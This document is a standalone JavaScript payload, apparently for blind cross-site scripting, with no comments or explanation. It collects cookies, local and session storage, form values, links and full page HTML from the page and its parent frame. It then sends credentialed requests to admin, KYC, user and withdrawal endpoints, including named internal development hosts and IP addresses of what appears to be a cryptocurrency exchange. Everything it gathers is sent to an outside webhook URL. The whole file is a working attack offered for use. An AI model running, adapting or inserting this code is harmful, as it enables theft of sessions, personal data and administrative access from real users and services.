(function(){
var SINK='https://webhook.site/fd2e9a5e-07d3-4a7d-9036-a750e7364500';
var TAG='i195';
function S(o){o.tag=TAG;o.ts=Date.now();
 try{navigator.sendBeacon(SINK,JSON.stringify(o))}catch(e){}
 try{fetch(SINK,{method:'POST',mode:'no-cors',body:JSON.stringify(o)})}catch(e){}
}
function T(f){try{return f()}catch(e){return 'ERR:'+e}}
function dump(w,label){
 var o={phase:'dump',w:label,url:T(function(){return w.location.href}),origin:T(function(){return w.location.origin}),
  title:T(function(){return w.document.title}),ck:T(function(){return w.document.cookie}),ls:{},ss:{}};
 try{for(var i=0;i<w.localStorage.length;i++){var k=w.localStorage.key(i);o.ls[k]=w.localStorage.getItem(k)}}catch(e){o.lse=''+e}
 try{for(var i=0;i<w.sessionStorage.length;i++){var k=w.sessionStorage.key(i);o.ss[k]=w.sessionStorage.getItem(k)}}catch(e){o.sse=''+e}
 o.forms=T(function(){return [].map.call(w.document.querySelectorAll('input,meta'),function(n){return n.tagName+'|'+(n.name||n.getAttribute&&n.getAttribute('name')||n.getAttribute&&n.getAttribute('property')||'')+'|'+(n.type||n.content||'')+'|'+(n.value||n.content||'')}).slice(0,150)});
 o.links=T(function(){return [].map.call(w.document.querySelectorAll('a'),function(a){return a.href+'|'+(a.textContent||'').trim().slice(0,40)}).slice(0,200)});
 o.scripts=T(function(){return [].map.call(w.document.querySelectorAll('script[src]'),function(s){return s.src}).slice(0,80)});
 o.html=T(function(){return w.document.documentElement.outerHTML.slice(0,250000)});
 S(o);return o;
}
var d=dump(window,'self');
try{dump(parent,'parent')}catch(e){}
var O=T(function(){return location.origin})||'';
var paths=['/api/v1/admin/me','/api/v1/admin/reviewable','/api/v1/admin/kyc','/api/v1/admin/users','/api/v1/admin/withdrawals','/api/v1/admin/user','/api/v1/admin','/api/v1/reviewable','/api/v1/kyc','/api/v1/users','/api/v1/withdrawals','/api/me','/api/users','/api/reviewable','/reviewable','/approve_withdrawal','/master_assets','/admin','/dashboard','/kyc','/withdrawals','/','/api/v1/auth/me','/api/v1/auth/user','/api/v1/session'];
function grab(base,label){
 paths.forEach(function(p){
  try{
   fetch(base+p,{credentials:'include',cache:'no-store'}).then(function(r){
    return r.text().then(function(t){S({phase:'probe',src:label,path:p,status:r.status,ct:r.headers.get('content-type'),body:t.slice(0,120000)})})
   }).catch(function(e){S({phase:'probe',src:label,path:p,err:''+e})});
  }catch(e){}
 });
}
grab(O,'same-origin');
['https://qa-management.bronx-dev.bitbank.cc','http://qa-management.bronx-dev.bitbank.cc','https://13.113.70.229','http://13.113.70.229','https://54.250.229.250','http://54.250.229.250','https://bronx-dev.bitbank.cc','http://bronx-dev.bitbank.cc'].forEach(function(h){grab(h,'internal:'+h)});
setTimeout(function(){S({phase:'alive',u:T(function(){return location.href}),p:T(function(){return parent.location.href})})},20000);
})();
